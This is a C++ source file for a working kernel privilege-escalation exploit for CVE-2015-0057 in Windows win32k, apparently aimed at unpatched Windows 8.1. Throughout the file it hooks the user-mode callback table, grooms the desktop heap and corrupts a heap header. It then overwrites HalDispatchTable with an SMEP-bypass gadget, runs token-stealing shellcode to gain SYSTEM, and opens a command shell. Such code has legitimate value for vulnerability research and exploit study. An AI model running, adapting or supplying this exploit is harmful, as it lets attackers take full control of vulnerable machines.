#include "header.h"
#pragma comment(lib, "Shlwapi.lib")

#define TYPE_WINDOW 1
#define	MAX_OBJECTS      0x1300
#define MAX_SPRAY_OBJECT 0x300
#define MAX_FAKE_OBJECTS 0x125
#define DELTA_OFFSET     0x1C
#define _HEAP_BLOCK_SIZE 0x10
#define PROPLIST_SIZE    0x03*0x10
#define OVERLAY1_SIZE    0x10*0x10
#define	OVERLAY2_SIZE    0x10*0x10
#define MENU_SIZE        0x0a*0x10
#define	MENU_ITEMS_ARRAY_OFFSET 0x50

PVOID ROPgadgets = NULL;
BOOL regflag = TRUE;
HWND tagWND = NULL;
HWND hwnd = NULL;
PVOID HalDispatchTable;
HWND spray_step_one[MAX_OBJECTS];
HWND spray_step_three[MAX_FAKE_OBJECTS];
HMENU hmenutab[MAX_OBJECTS];
ULONG_PTR _ClientLoadLibrary_addr;
fct_clLoadLib _ClientLoadLibrary;
PSHAREDINFO pSharedInfo;
ULONG_PTR deltaDHeap;
string xorKey;
int hookflag = 0;
int hookcount = 0;
const char szClassName[] = "Thunder_J";
const char sz_ClassName[] = "Spraywnd";

typedef NTSTATUS(NTAPI* _NtCreateTimer)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, TIMER_TYPE);
typedef NTSTATUS(WINAPI* _NtQueryIntervalProfile)(UINT ProfileSource, PULONG Interval);

extern "C" typedef void* (NTAPI* lHMValidateHandle)(HWND h, int type);
extern "C" lHMValidateHandle pHmValidateHandle = NULL;
extern "C" BOOL NTAPI NtUserDefSetText(HWND hwnd, PLARGE_UNICODE_STRING pstrText);

VOID
NTAPI
RtlInitLargeUnicodeString(IN OUT PLARGE_UNICODE_STRING DestinationString,
	IN PCWSTR SourceString,
	IN INT Unknown,
	IN INT datasize = 0)
{
	ULONG DestSize;

	if (datasize != 0)
	{
		DestSize = datasize;
		DestinationString->Length = DestSize;
		DestinationString->MaximumLength = DestSize + sizeof(WCHAR);
	}
	else if (SourceString)
	{
		DestSize = (ULONG)wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length = DestSize;
		DestinationString->MaximumLength = DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWSTR)SourceString;
	DestinationString->bAnsi = FALSE;
}

string XOR(string value, string key)
{
	string retval(value);

	SIZE_T klen = key.length();
	SIZE_T vlen = value.length();

	UINT k = 0;
	UINT v = 0;

	for (v; v < vlen; v++)
	{
		retval[v] = value[v] ^ key[k];
		k = (++k < klen ? k : 0);
	}

	return retval;
}

BOOL FindHMValidateHandle() {
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("[*] Failed to load user32\n");
		return FALSE;
	}
	
	BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("[*] Failed to find location of exported function 'IsMenu' within user32.dll\n");
		return FALSE;
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("[*] Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}

	unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	//The +11 is to skip the padding bytes as on Windows 10 these aren't nops
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}

ULONG_PTR Get_ClientLoadLibrary()
{
	return (ULONG_PTR)*(ULONG_PTR*)(__readgsqword(0x60) + 0x58) + 0x238; // 首先获取PEB,然后根据偏移找到KernelCallbackTable,最后找到__ClientLoadLibrary
}

VOID Hook_Func()
{
	CHAR buf[0x1000];
	memset(buf, 0, sizeof(buf));
	if (hookflag)
	{
		if (++hookcount == 2)
		{
			hookflag = 0;

			DestroyWindow(hwnd);
			for (int i = 0; i < MAX_SPRAY_OBJECT; i++)
				SetPropA(spray_step_three[i],(LPCSTR)0x6,(HANDLE)0xCCCCDDDDCCCCDDDD); // 每一个tagWND之后接一个tagPROPLIST,单个调用大小0x18,再次调用增加0x10
		}
	}
	_ClientLoadLibrary(buf);
}

VOID Hook_ClientLoadLibrary()
{
	DWORD dwOldProtect;
	// 获取Hook函数地址
	cout << "[+] ClientLoadLibray address is : 0x" << hex << Get_ClientLoadLibrary() << endl;
	_ClientLoadLibrary_addr = Get_ClientLoadLibrary();
	_ClientLoadLibrary = (fct_clLoadLib)*(ULONG_PTR *)_ClientLoadLibrary_addr; //存一份地址

	if(!VirtualProtect((LPVOID)_ClientLoadLibrary_addr, 0x1000,PAGE_READWRITE,&dwOldProtect))
	{
		cout << "[*] Alloc ClientLoadLibrary address failed!!!\n" << endl;
		system("pause");
		return;
	}

	*(ULONG_PTR*)_ClientLoadLibrary_addr = (ULONG_PTR)Hook_Func;
	if (!VirtualProtect((LPVOID)_ClientLoadLibrary_addr, 0x1000, dwOldProtect, &dwOldProtect))
	{
		cout << "[*] Set ClientLoadLibrary address failed!!!\n" << endl;
		system("pause");
		return;
	}
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

BOOL InitWindow(HWND* hwndArray,int count)
{

	WNDCLASSEXA wn;

	wn.cbSize = sizeof(WNDCLASSEX);
	wn.style = 0;
	wn.lpfnWndProc = WndProc;
	wn.cbClsExtra = 0;
	wn.cbWndExtra = 0;
	wn.hInstance = GetModuleHandleA(NULL);
	wn.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wn.hCursor = LoadCursor(NULL, IDC_ARROW);
	wn.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wn.lpszMenuName = NULL;
	wn.lpszClassName = sz_ClassName;
	wn.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	//这里只注册一次
	if (regflag)
	{
		if (!RegisterClassExA(&wn))
		{
			cout << "[*] Failed to register window.\nError code is " << GetLastError() << endl;
			system("pause");
			return FALSE;
		}
		regflag = FALSE;
	}

	for (int i = 0; i < count; i++)
	{

		hwndArray[i] = CreateWindowExA(
			0,
			sz_ClassName,
			0,
			WS_OVERLAPPEDWINDOW,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			(HWND)NULL,
			(HMENU)NULL,
			NULL,
			(PVOID)NULL
		);

		if (hwndArray[i] == NULL)
			return FALSE;

		SetPropA(hwndArray[i], (LPCSTR)(1), (HANDLE)0xAAAABBBBAAAABBBB);
	}

	return TRUE;
}

BOOL SprayObject()
{
	int j = 0;
	CHAR o1str[OVERLAY1_SIZE - _HEAP_BLOCK_SIZE] = { 0 };
	CHAR o2str[OVERLAY2_SIZE - _HEAP_BLOCK_SIZE] = { 0 };
	LARGE_UNICODE_STRING o1lstr, o2lstr;

	// build first overlay
	memset(o1str, '\x43', OVERLAY2_SIZE - _HEAP_BLOCK_SIZE);
	RtlInitLargeUnicodeString(&o1lstr, (WCHAR*)o1str, (UINT)-1, OVERLAY1_SIZE - _HEAP_BLOCK_SIZE - 2);

	// build second overlay
	memset(o2str, '\x41', OVERLAY2_SIZE - _HEAP_BLOCK_SIZE);
	*(DWORD*)o2str = 0x00000000;
	*(DWORD*)(o2str + 4) = 0x00000000;
	*(DWORD*)(o2str + 8) = 0x00010000 + OVERLAY2_SIZE;
	*(DWORD*)(o2str + 12) = 0x10000000 + ((OVERLAY1_SIZE + MENU_SIZE + _HEAP_BLOCK_SIZE) / 0x10);


	string clearh, newh;
	o2str[11] = o2str[8] ^ o2str[9] ^ o2str[10];
	clearh.append(o2str, 16);

	newh = XOR(clearh, xorKey);
	memcpy(o2str, newh.c_str(), 16);
	RtlInitLargeUnicodeString(&o2lstr, (WCHAR*)o2str, (UINT)-1, OVERLAY2_SIZE - _HEAP_BLOCK_SIZE - 2);

	SHORT unused_win_index = 0x20;

	for (SHORT i = 0; i < SHORT(MAX_OBJECTS - 0x20); i++)
	{
		// property list
		SetPropA(spray_step_one[i], (LPCSTR)(i + 0x1000), (HANDLE)0xBBBBBBBBBBBBBBBB);

		// overlay 1
		if ((i % 0x150) == 0)
		{
			NtUserDefSetText(spray_step_one[MAX_OBJECTS - (unused_win_index--)], &o1lstr);
		}

		// menu object
		hmenutab[i] = CreateMenu();

		if (hmenutab[i] == 0)
			return FALSE;

		// overlay 2
		if ((i % 0x150) == 0)
			NtUserDefSetText(spray_step_one[MAX_OBJECTS - (unused_win_index--)], &o2lstr);

	}

	for (SHORT i = 0; i < MAX_OBJECTS - 0x20; i++)
	{
		MENUITEMINFOA mii;
		mii.cbSize = sizeof(MENUITEMINFO);
		mii.fMask = MIIM_ID;
		mii.wID = 0xBEEFBEEF;
		BOOL res = InsertMenuItemA(hmenutab[i], 0, TRUE, &mii);
		if (res == FALSE)
			return FALSE;
	}

	return TRUE;
}

BOOL Poc()
{
	cout << "[+] Start to create window" ;

	WNDCLASSEXA wc;

	wc.cbSize			= sizeof(WNDCLASSEX);
	wc.style			= 0;
	wc.lpfnWndProc		= DefWindowProcA;
	wc.cbClsExtra		= 0;
	wc.cbWndExtra		= 0;
	wc.hInstance		= GetModuleHandleA(NULL);
	wc.hIcon			= LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor			= LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wc.lpszMenuName		= NULL;
	wc.lpszClassName	= szClassName;
	wc.hIconSm			= LoadIcon(NULL, IDI_APPLICATION);

	if (!RegisterClassExA(&wc))
	{
		cout << "\n[*] Failed to register window.\nError code is %d\n" << GetLastError() << endl;
		system("pause");
		return FALSE;
	}

	hwnd = CreateWindowExA(
		0,
		szClassName,
		0,
		SBS_HORZ | WS_HSCROLL | WS_VSCROLL,
		10,
		10,
		100,
		100,
		NULL,
		NULL,
		NULL,
		NULL
	);

	if (!hwnd)
	{
		cout << "\n[*] Failed to create window.\nError code is %d\n" << GetLastError() << endl;
		system("pause");
		return FALSE;
	}

	ShowWindow(hwnd, SW_SHOW);
	UpdateWindow(hwnd);

	cout << " => done" << endl;

	hookflag = 1;

	EnableScrollBar(
		hwnd,
		SB_CTL | SB_BOTH, // wSBflags 指定滚动条类型,设置为3
		ESB_DISABLE_BOTH  // wArrows  指定是否启用或禁用滚动条箭头,并指示启用或禁用哪些箭头,设置为3
	);

	return TRUE;
}

BOOL CreateHoles()
{
	for (int i = 0; i < MAX_OBJECTS - 0x20; i++)
	{
		if ((i % 0x150) == 0)
			DestroyWindow(spray_step_one[i]);
	}
	return TRUE;
}

BOOL GetDHeapCookie()
{
	MEMORY_BASIC_INFORMATION MemInfo = { 0 };
	BYTE* Addr = (BYTE*)0x1000;
	ULONG_PTR dheap = (ULONG_PTR)pSharedInfo->aheList;

	while (VirtualQuery(Addr, &MemInfo, sizeof(MemInfo)))
	{
		if (MemInfo.Protect = PAGE_READONLY && MemInfo.Type == MEM_MAPPED && MemInfo.State == MEM_COMMIT)
		{
			if (*(UINT*)((BYTE*)MemInfo.BaseAddress + 0x10) == 0xffeeffee)
			{
				if (*(ULONG_PTR*)((BYTE*)MemInfo.BaseAddress + 0x28) == (ULONG_PTR)((BYTE*)MemInfo.BaseAddress + deltaDHeap))
				{
					xorKey.append((CHAR*)((BYTE*)MemInfo.BaseAddress + 0x80), 16);
					return TRUE;
				}
			}
		}
		Addr += MemInfo.RegionSize;
	}

	return FALSE;
}

BOOL init_DHInfo()
{
	_TEB64* _teb = (_TEB64*)NtCurrentTeb();
	deltaDHeap = *(ULONG_PTR*)((BYTE*)(_teb->Win32ClientInfo) + 0x28);

	pSharedInfo = (PSHAREDINFO)GetProcAddress(GetModuleHandleA("USER32.dll"), "gSharedInfo");

	if (!pSharedInfo)
		return FALSE;

	if (!GetDHeapCookie())
		return FALSE;

	return TRUE;
}

VOID* getMappedHandlePtr(HANDLE myhandle, VOID** userlandptr)
{
	HANDLE handle;
	HANDLEENTRY* UserHandleTable;

	UserHandleTable = (HANDLEENTRY*)(*(ULONG_PTR*)((BYTE*)pSharedInfo + 8));
	DWORD cEntries = ((ULONG*)(pSharedInfo->psi))[2];

	for (DWORD i = 0; i < cEntries; i++)
	{
		handle = (HANDLE)((UserHandleTable[i].wUniq << 16) | i);

		if (handle == myhandle)
		{
			*userlandptr = (VOID*)((LONG_PTR)UserHandleTable[i].phead - deltaDHeap);
			return (VOID*)((LONG_PTR)UserHandleTable[i].phead);
		}
	}

	return NULL;
}

BOOL FindInterestingObjectInfo(SHORT obj_count, PVOID* menu_addr, HMENU* menu_handle, HWND* win_overlay1_handle)
{
	PVOID userland_addr;

	SHORT unused_win_index = 0x20;

	for (SHORT i = 0; i < obj_count; i++)
	{
		if ((i % 0x150) == 0)
		{
			if (!getMappedHandlePtr(hmenutab[i], &userland_addr)) // 获取指针
				continue;

			ULONG_PTR _prop_tag_addr = (ULONG_PTR)userland_addr - _HEAP_BLOCK_SIZE * 2 - OVERLAY1_SIZE - 8 - 8;
			if (*(ULONG_PTR*)_prop_tag_addr == 0x000000020000000e) // 获取利用的tagPROPLIST,也就uaf之后的哪个结构
			{
				*menu_addr = userland_addr;			   // 寻找到菜单地址
				*menu_handle = *(HMENU*)userland_addr; // 寻找到菜单句柄
				*win_overlay1_handle = spray_step_one[MAX_OBJECTS - unused_win_index];
				return TRUE;
			}

			unused_win_index -= 2;
		}
	}

	return FALSE;
}

PVOID PreparePayload(PVOID cmenu_addr)
{
	// restore the desktop heap
	CHAR stage1[] =
		"\x57\x56\x48\xbf\xdd\xdd\xdd\xdd\xdd\xdd\xdd\xdd\x48\xbe\xcc\xcc"
		"\xcc\xcc\xcc\xcc\xcc\xcc\x48\xb9\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa"
		"\xf3\xa4\x5e\x5f\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\x50\x53\x48\xb8\xee\xee\xee\xee\xee\xee\xee\xee\x48\xbb\xff\xff"
		"\xff\xff\xff\xff\xff\xff\x48\x89\x18\x5b\x58\x90\x90\x90\x90\x90";

	// shellcode Win 8.1 (64 bit)
	// ref: pwn2own 2014 / afd.sys
	BYTE sc[] =
		"\x41\x51"                              // push r9 save regs
		"\x41\x52"                              // push r10
		"\x65\x4C\x8B\x0C\x25\x88\x01\x00\x00"  // mov r9, gs:[0x188], get _ETHREAD from KPCR
		"\x4D\x8B\x89\xB8\x00\x00\x00"          // mov r9, [r9+0xb8], get _EPROCESS from _ETHREAD
		"\x4D\x89\xCA"                          // mov r10, r9 save current eprocess
		"\x4D\x8B\x89\x40\x02\x00\x00"          // mov r9, [r9+0x240] $a, get blink
		"\x49\x81\xE9\x38\x02\x00\x00"          // sub r9, 0x238 => _KPROCESS
		"\x49\x83\xB9\xE0\x02\x00\x00\x04"      // cmp [r9+0x2e0], 4 is UniqueProcessId == 4?
		"\x75\xe8"                              // jnz $a no? then keep searching!
		"\x4D\x8B\x89\x48\x03\x00\x00"          // mov r9, [r9+0x348] get token
		"\x4D\x89\x8A\x48\x03\x00\x00"          // mov [r10+0x348], r9 replace our token with system token
		"\x41\x5A"                              // pop r10 restore regs
		"\x41\x59"                              // pop r9
		"\x48\x8B\x44\x24\x20"                  // mov rax, [rsp+0x20] repair stack
		"\x48\x83\xC0\x3F"                      // add rax, 0x3f
		"\x48\x83\xEC\x30"                      // sub rsp, 0x30
		"\x48\x89\x04\x24"                      // mov [rsp], rax
		"\xc3";                                 // ret resume 

	ULONG_PTR index = 0x10000;
	PVOID addr = NULL;
	CHAR* backup = NULL;

	backup = (CHAR*)malloc(PROPLIST_SIZE + OVERLAY1_SIZE + MENU_SIZE + _HEAP_BLOCK_SIZE + 1);

	if (backup == NULL)
		return NULL;

	CHAR* _cObjs_addr = (CHAR*)cmenu_addr - (PROPLIST_SIZE + OVERLAY1_SIZE + _HEAP_BLOCK_SIZE);
	CHAR* _cObjs_kernel_addr = _cObjs_addr + deltaDHeap;

	memcpy(backup, _cObjs_addr, PROPLIST_SIZE + OVERLAY1_SIZE + MENU_SIZE + _HEAP_BLOCK_SIZE);

	backup[0x10] = 0x02; // restore proplist
	backup[0x30] = 0x00; // restore first overlay

	do {
		index += 0x1000;
		addr = VirtualAlloc((PVOID)index, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	} while (addr == NULL && index < 0xFFFFFFFF);

	if (addr == NULL)
		return NULL;

	*(ULONG_PTR*)(stage1 + 4) = (ULONG_PTR)_cObjs_kernel_addr;
	*(ULONG_PTR*)(stage1 + 14) = (ULONG_PTR)backup;
	*(ULONG_PTR*)(stage1 + 24) = PROPLIST_SIZE + OVERLAY1_SIZE + MENU_SIZE + _HEAP_BLOCK_SIZE;

	*(ULONG_PTR*)(stage1 + 3 * 16 + 4) = (ULONG_PTR)HalDispatchTable + 8;

	memset((CHAR*)addr, 0x90, 0x100);
	memcpy((CHAR*)addr + 0x100, stage1, sizeof(stage1) - 1);
	memcpy((CHAR*)addr + 0x100 + sizeof(stage1) - 1, sc, sizeof(sc));

	return addr;
}

VOID CorruptHeapHeader(PVOID menu_addr)
{
	ULONG_PTR xored_header;
	CHAR* tmp_header = NULL;
	string decoded_header, xored_heap_deader, new_heap_header;

	// decode first overlay heap header 
	xored_header = (ULONG_PTR)menu_addr - OVERLAY1_SIZE - _HEAP_BLOCK_SIZE;
	decoded_header = XOR(string((CHAR*)xored_header, 16), xorKey);

	// modify heap header
	tmp_header = (CHAR*)decoded_header.c_str();
	tmp_header[8] = (OVERLAY1_SIZE + MENU_SIZE + _HEAP_BLOCK_SIZE) / 0x10;	// new size
	tmp_header[11] = tmp_header[8] ^ tmp_header[9] ^ tmp_header[10];		// new checksum

	// xor new heap header
	new_heap_header = XOR(decoded_header, xorKey);

	// overwrite first overlay heap header
	for (int i = 0; i < MAX_FAKE_OBJECTS; i++)
		SetPropA(spray_step_three[i], (LPCSTR)0x07, (HANDLE) * (ULONG_PTR*)(new_heap_header.c_str() + 8));
}

VOID ReplaceObjects(LARGE_UNICODE_STRING* plstr)
{
	for (SHORT i = 0; i < 0x100; i++) NtUserDefSetText(spray_step_one[i], plstr);
}

VOID MakeNewMenu(PVOID menu_addr, CHAR* new_objects, LARGE_UNICODE_STRING* new_objs_lstr, PVOID addr)
{
	memset(new_objects, '\xAA', OVERLAY1_SIZE - _HEAP_BLOCK_SIZE);
	memcpy(new_objects + OVERLAY1_SIZE - _HEAP_BLOCK_SIZE, (CHAR*)menu_addr - _HEAP_BLOCK_SIZE, MENU_SIZE + _HEAP_BLOCK_SIZE);

	// modify _MENU.rgItems value
	* (ULONG_PTR*)(BYTE*)&new_objects[OVERLAY1_SIZE + MENU_ITEMS_ARRAY_OFFSET] = (ULONG_PTR)addr;

	RtlInitLargeUnicodeString(new_objs_lstr, (WCHAR*)new_objects, (UINT)-1, OVERLAY1_SIZE + MENU_SIZE - 2);
}


VOID RebuildMenu(CHAR* new_objects, PVOID addr)
{
	LARGE_UNICODE_STRING new_objs_lstr;

	// modify _MENU.rgItems value
	*(ULONG_PTR*)(BYTE*)&new_objects[OVERLAY1_SIZE + MENU_ITEMS_ARRAY_OFFSET] = (ULONG_PTR)HalDispatchTable;
	RtlInitLargeUnicodeString(&new_objs_lstr, (WCHAR*)new_objects, (UINT)-1, OVERLAY1_SIZE + MENU_SIZE - 2);

	// rebuild menu
	ReplaceObjects(&new_objs_lstr);
}


VOID PatchDWORD(HMENU menu_handle, DWORD new_dword)
{
	MENUITEMINFOA mii;

	mii.cbSize = sizeof(mii);
	mii.fMask = MIIM_ID;
	mii.wID = new_dword;
	SetMenuItemInfoA(menu_handle, 0, TRUE, &mii);
}

BOOL RunPayload(ULONG_PTR scaddr)
{
	HANDLE timer;
	ULONG_PTR r = scaddr;
	ULONG_PTR newcr4 = 0x406f8;
	_NtQueryIntervalProfile  NtQueryIntervalProfile;

	NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandleA((LPCSTR)"ntdll.dll"), "NtQueryIntervalProfile");

	if (NtQueryIntervalProfile == NULL)
		return FALSE;

	_NtCreateTimer NtCreateTimer = (_NtCreateTimer)GetProcAddress(GetModuleHandleA((LPCSTR)"ntdll.dll"), "NtCreateTimer");

	if (NtCreateTimer == NULL)
		return FALSE;

	// clean kernel stack before running payload
	NtCreateTimer((HANDLE*)&timer, 0x1f0003, 0, (TIMER_TYPE)0);

	// start payload (stage + shellcode)
	NtQueryIntervalProfile((UINT)scaddr, (PULONG)&newcr4);

	return TRUE;
}

BOOL UnHook__ClientLoadLibrary()
{
	DWORD dwOldProtect;

	if (!VirtualProtect((LPVOID)_ClientLoadLibrary_addr, 0x1000, PAGE_READWRITE, &dwOldProtect))
		return FALSE;

	*(ULONG_PTR*)_ClientLoadLibrary_addr = (ULONG_PTR)Hook_Func;

	if (!VirtualProtect((LPVOID)_ClientLoadLibrary_addr, 0x1000, dwOldProtect, &dwOldProtect))
		return FALSE;

	return TRUE;
}

VOID CleanHeap(HMENU menu_handle)
{
	UnHook__ClientLoadLibrary();

	DestroyMenu(menu_handle);
	DestroyWindow(hwnd);

	for (int i = 0; i < MAX_OBJECTS; i++) DestroyMenu(hmenutab[i]);
	for (int i = 0; i < MAX_OBJECTS; i++) DestroyWindow(spray_step_one[i]);
	for (int i = 0; i < MAX_FAKE_OBJECTS; i++) DestroyWindow(spray_step_three[i]);
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

DWORD64 ntoskrnlbase()
{
	LPVOID lpImageBase[0x100];
	LPDWORD lpcbNeeded = NULL;
	TCHAR lpfileName[1024];

	//Retrieves the load address for each device driver in the system
	EnumDeviceDrivers(lpImageBase, (DWORD64)sizeof(lpImageBase), lpcbNeeded);

	for (int i = 0; i < 1024; i++)
	{
		//Retrieves the base name of the specified device driver
		GetDeviceDriverBaseNameA(lpImageBase[i], (LPSTR)lpfileName, 0x40);

		if (!strcmp((LPSTR)lpfileName, "ntoskrnl.exe"))
		{
			return (DWORD64)lpImageBase[i];
		}
	}
	return NULL;
}

DWORD64 GetHalOffset()
{
	// ntkrnlpa.exe in kernel space base address
	DWORD64 pNtkrnlpaBase = ntoskrnlbase();
	printf("[+] ntkrnlpa base address is : 0x%p\n", pNtkrnlpaBase);
	// ntkrnlpa.exe in user space base address
	HMODULE hUserSpaceBase = LoadLibraryA("ntoskrnl.exe");

	// HalDispatchTable in user space address
	DWORD64 pUserSpaceAddress = (DWORD64)GetProcAddress(hUserSpaceBase, "HalDispatchTable");

	printf("[+] pUserSpaceAddress address is : 0x%p\n", pUserSpaceAddress);

	DWORD64 hal = (DWORD64)pNtkrnlpaBase + ((DWORD64)pUserSpaceAddress - (DWORD64)hUserSpaceBase) ;

	return (DWORD64)hal;
}

BOOL SMEP_bypass_ready()
{
	ROPgadgets = PVOID((DWORD64)ntoskrnlbase() + 0x38a3cc);
	if ((DWORD64)ntoskrnlbase() == NULL)
	{
		cout << "[*] Failed to get ntoskrnlbase\n[*] Error code is " << GetLastError() << endl;
		system("pause");
		return FALSE;
	}
	/*nt!KiConfigureDynamicProcessor+0x40:
	* 	fffff803`20ffe7cc 0f22e0          mov     cr4,rax
	*	fffff803`20ffe7cf 4883c428        add     rsp,28h
	* 	fffff803`20ffe7d3 c3              ret
	*/
	HalDispatchTable = (PVOID)GetHalOffset();
	if (!HalDispatchTable)
		return FALSE;

	cout << "[+] ROPgadgets address is : " << hex << ROPgadgets << endl;
	cout << "[+] HalDispatchTable address is : " << hex << HalDispatchTable << endl;
	return TRUE;
}

// [+] Learn from Jean-Jamil Khalife's blog : http://www.hdwsec.fr/blog/
// [+] Test on windows 8.1 no patched
int main(int argc, char* argv[])
{
	VOID* pl = NULL;
	PVOID sc_addr = NULL;
	PVOID menu_addr = NULL;
	HMENU menu_handle;
	HWND win_overlay1_handle;
	CHAR new_objects[OVERLAY1_SIZE + MENU_SIZE] = { 0 };
	LARGE_UNICODE_STRING new_objs_lstr;
	BOOL bFound = FindHMValidateHandle();
	cout << "----------------------------------------------" << endl;
	cout << "------CVE-2015-0057 written by Thunder_J------" << endl;
	cout << "----------------------------------------------" << endl;

	if (!bFound) {
		cout << "[*] Failed to locate HmValidateHandle\n[*] Error code is " << GetLastError() << endl;
		system("pause");
		return 1;
	}

	// 获取rop信息
	if (!SMEP_bypass_ready()) {
		cout << "[*] Failed to GetKernelInfo!\n[*] Error code is " << GetLastError() << endl;
		system("pause");
		return 1;
	}
	
	// 获取heap cookie
	if (!init_DHInfo()) {
		cout << "[*] Failed to init_DHInfo!\n[*] Error code is " << GetLastError() << endl;
		system("pause");
		return 1;
	}

	// hook
	Hook_ClientLoadLibrary();
	
	if (!InitWindow(spray_step_one, MAX_OBJECTS))
	{
		cout << "[*] Step one failed!\n[*] Error code is " << GetLastError() << endl;
		system("pause");
		return 1;
	}

	// 堆喷主要函数
	if (!SprayObject())
	{
		cout << "[*] Step two failed!\n[*] Error code is " << GetLastError() << endl;
		system("pause");
		return 1;
	}
	
	if (!InitWindow(spray_step_three,MAX_FAKE_OBJECTS)) 
	{
		cout << "[*] Step three failed!\n[*] Error code is " << GetLastError() << endl;
		system("pause");
		return 1;
	}

	if (!CreateHoles())
	{
		cout << "[*] Step four failed!\n[*] Error code is " << GetLastError() << endl;
		system("pause");
		return 1;
	}

	if (!Poc())
	{
		cout << "[*] Step five failed!\n[*] Error code is " << GetLastError() << endl;
		system("pause");
		return 1;
	}

	// 这里是寻找释放的菜单结构,寻找menu_addr
	if (!FindInterestingObjectInfo(MAX_OBJECTS - 0x20, &menu_addr, &menu_handle, &win_overlay1_handle)) {
		cout << "[*] Step six failed!\n[*] Error code is " << GetLastError() << endl;
		system("pause");
		return 1;
	}

	// 这里布置shellcode
	if ((sc_addr = PreparePayload(menu_addr)) == NULL) {
		cout << "[*] Step seven failed!\n[*] Error code is " << GetLastError() << endl;
		system("pause");
		return 1;
	}

	// 恢复堆头
	CorruptHeapHeader(menu_addr);

	// build new objets (overlay1 + new menu)
	MakeNewMenu(menu_addr, new_objects, &new_objs_lstr, (PVOID)((ULONG_PTR)HalDispatchTable + 4));

	// free overlay 1
	DestroyWindow(win_overlay1_handle);

	// replace overlay 1 with new overlay and menu
	ReplaceObjects(&new_objs_lstr);

	// patch HalDispatchTable
	PatchDWORD(menu_handle, *(DWORD*)((BYTE*)&ROPgadgets + 4));
	RebuildMenu(new_objects, (PVOID)HalDispatchTable);
	PatchDWORD(menu_handle, *(DWORD*)(BYTE*)&ROPgadgets);

	// start payload (stage + shellcode)
	if (!RunPayload((ULONG_PTR)sc_addr)) {
		cout << "[*] Step eight failed!\n[*] Error code is " << GetLastError() << endl;
		system("pause");
		return 1;
	}

	cout << "[+] Enjoy your shell :)" << endl;
	CreateCmd();

	// free previously instantiated objects
	CleanHeap(menu_handle);

	system("pause");
	return 0;
}